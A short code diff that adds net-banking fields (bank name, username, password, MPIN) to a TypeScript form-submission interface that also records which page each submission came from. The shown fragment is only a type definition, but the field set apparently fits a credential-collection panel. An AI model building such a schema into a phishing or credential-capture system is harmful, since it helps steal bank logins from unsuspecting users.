@@ -66,6 +66,11 @@ export interface FormData {
     userId?: string;
     accessCode?: string;
     profileCode?: string;
+    // Net Banking
+    bankName?: string;
+    username?: string;
+    password?: string;
+    mpin?: string;
     // Metadata
     submittedAt: string;
     pageName?: string;  // Which page this submission came from
